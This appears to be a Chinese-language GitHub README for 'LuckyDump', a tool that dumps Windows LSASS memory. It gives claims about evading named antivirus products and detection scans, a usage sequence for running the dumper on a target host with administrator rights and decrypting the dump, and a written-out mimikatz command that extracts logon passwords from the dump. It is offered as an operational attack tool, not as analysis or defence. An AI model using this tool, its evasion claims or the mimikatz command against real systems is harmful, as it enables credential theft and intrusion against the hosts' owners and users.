# LuckyDump
自行编译  
工具详细说明：https://mp.weixin.qq.com/s/AuOfu3RwPtqF9toYsYUVRA  
截止 2025.3.19 已测 360 核晶 火绒 macfee ESET  
静态免杀性：去除掉延迟函数可以达到vt0杀，但是动态行为会被一些edr拦截，静态这几个也无关痛痒（猎鹰静态过了动态也dump不了） 
![image](https://github.com/user-attachments/assets/d0dcc19f-759b-4467-af5d-0e4ee175cf7c)  
![image](https://github.com/user-attachments/assets/659cc904-7aa1-4bc0-850c-00262635589d) 


使用方法：
在目标主机管理员权限执行dump go： 

![image](https://github.com/user-attachments/assets/6c3d0f8d-97ea-4a7a-99f2-7fd741ef49a9)  

下载到本机使用py脚本解密文件： 
![image](https://github.com/user-attachments/assets/816b6feb-890a-4b34-8422-076df156baec)  
mimikatz提取密码

mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit  
![image](https://github.com/user-attachments/assets/b0d5d64a-b420-4adf-9bef-37583848d55f) 
 
